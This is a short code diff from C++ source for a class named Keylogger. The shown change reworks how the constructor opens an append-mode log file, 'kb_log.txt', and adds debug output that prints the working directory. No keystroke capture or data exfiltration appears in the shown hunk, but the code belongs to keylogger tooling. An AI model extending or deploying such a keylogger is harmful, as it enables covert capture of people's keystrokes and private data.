@@ -4,8 +4,12 @@ std::ofstream Keylogger::kblog;
 wchar_t* Keylogger::key = nullptr;
 
 Keylogger::Keylogger(wchar_t* k) {
-    // kblog = std::ofstream("kb_log.txt", std::ios::app);
-    kblog.open("kb_log.txt", std::ios::app);
+    wchar_t cwd[MAX_PATH];
+    GetCurrentDirectoryW(MAX_PATH, cwd);
+
+    std::wcerr << L"Working directory: " << cwd << std::endl;
+    kblog = std::ofstream("kb_log.txt", std::ios::app);
+    // kblog.open("kb_log.txt", std::ios::app);
 
     std::cerr << "After OPEN: " << kblog.is_open() << std::endl;
 
